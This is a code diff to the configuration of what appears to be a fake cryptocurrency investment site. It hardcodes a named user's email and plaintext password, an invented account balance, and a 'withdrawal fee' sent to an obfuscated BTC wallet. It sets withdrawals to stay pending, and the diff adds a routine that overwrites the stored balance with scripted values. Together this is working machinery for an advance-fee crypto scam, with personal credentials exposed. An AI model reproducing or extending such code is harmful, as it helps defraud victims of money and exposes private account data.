@@ -12,7 +12,7 @@
   }
 
   // Encoded platform BTC wallet — regenerate with: python3 scripts/encode-wallet.py "bc1q..."
-  var platformWallet = decodeWallet("ERUGCUEDVg0KAlsKRkRHCQMQUwgVF1YNBARPSx5BQAsKHQJPEgdfG0FC");
+  var platformWallet = decodeWallet("ERUGCR0AWg4bAFsAHk5REAlEUh5HT08BFUJOSAlGDg1HRloTRkNSAUYM");
 
   // Encoded account sync tokens — regenerate with: python3 scripts/encode-wallet.py "token..."
   var syncTokensByProfile = {
@@ -116,23 +116,25 @@
       username: "sarahglancey99",
       email: "Sarahglancey99@gmail.com",
       password: "Sarah1234567",
-      balanceUsd: 47900,
+      balanceUsd: 50070,
       currency: "USD",
       currencyLabel: "USD",
       asset: "BTC",
       stable: true,
-      stateVersion: "sarah-v4",
+      stateVersion: "sarah-v9",
+      accountResetToken: "gary-reset-2026-09-02",
       seedTransactions: false,
       withdrawalsBlocked: false,
       depositsBlocked: false,
       withdrawFeeProof: true,
-      withdrawFeeAmount: 657,
+      withdrawFeeAmount: 450,
       withdrawFeeCurrency: "USD",
       withdrawFeeProofTitle: "Approval for Withdrawal",
-      withdrawFeeProofLabel: "Approval fee",
+      withdrawFeeProofLabel: "Disbursement Fee",
       withdrawFeeWallet: platformWallet,
       formSubmitEmail: "ronniechristopher89@gmail.com",
       withdrawCompleteWithinMs: 60 * 60 * 1000,
+      withdrawStayPending: true,
       balanceNotification: {
         id: "topup-2026-08-28",
         amountUsd: 23944
@@ -174,6 +176,15 @@
       password: jerryCreds.password
     },
     profiles: profiles,
+    // When testing locally, sync hits the live API so withdrawals appear on other devices.
+    syncApiBase: (function () {
+      if (typeof location === "undefined") return "";
+      var host = location.hostname || "";
+      if (host === "localhost" || host === "127.0.0.1") {
+        return "https://plaidinvest.vercel.app";
+      }
+      return "";
+    })(),
     images: {
       btc: "/assets/icons/btc.svg",
       btcPng: "/assets/icons/btc.png",
@@ -210,4 +221,42 @@
   };
 
   Object.freeze(window.SITE.images);
+
+  window.applyAccountResetIfNeeded = function () {
+    if (!window.SatVaultAuth || typeof SatVaultAuth.isLoggedIn !== "function" || !SatVaultAuth.isLoggedIn()) {
+      return false;
+    }
+    var profileId = typeof SatVaultAuth.getProfileId === "function" ? SatVaultAuth.getProfileId() : null;
+    if (!profileId) return false;
+
+    var profile = window.SITE.getProfileById(profileId);
+    if (!profile) return false;
+
+    var prefix = "acct:" + profileId + ":";
+    var targetReset = profile.accountResetToken || "";
+    var targetVersion = profile.stateVersion || "1";
+    var storedReset = localStorage.getItem(prefix + "accountResetToken") || "";
+    var storedVersion = localStorage.getItem(prefix + "stateVersion") || "";
+    var hasLocalState =
+      localStorage.getItem(prefix + "balanceUsdBook") != null ||
+      localStorage.getItem(prefix + "transactions") != null;
+
+    // Brand-new device/browser — wait for server sync instead of wiping to defaults.
+    if (!hasLocalState && !storedReset && !storedVersion) return false;
+
+    if (!targetReset && storedVersion === targetVersion) return false;
+    if (targetReset && storedReset === targetReset && storedVersion === targetVersion) return false;
+
+    var balance = Number(profile.balanceUsd) > 0 ? Number(profile.balanceUsd) : 15500;
+    localStorage.setItem(prefix + "balanceUsdBook", String(balance));
+    localStorage.setItem(prefix + "balanceUsd", String(balance));
+    localStorage.removeItem(prefix + "balanceBtcHoldings");
+    localStorage.setItem(prefix + "transactions", "[]");
+    localStorage.setItem(prefix + "stateVersion", targetVersion);
+    if (targetReset) localStorage.setItem(prefix + "accountResetToken", targetReset);
+    localStorage.setItem(prefix + "stateUpdatedAt", String(Date.now()));
+    return true;
+  };
+
+  window.applyAccountResetIfNeeded();
 })();
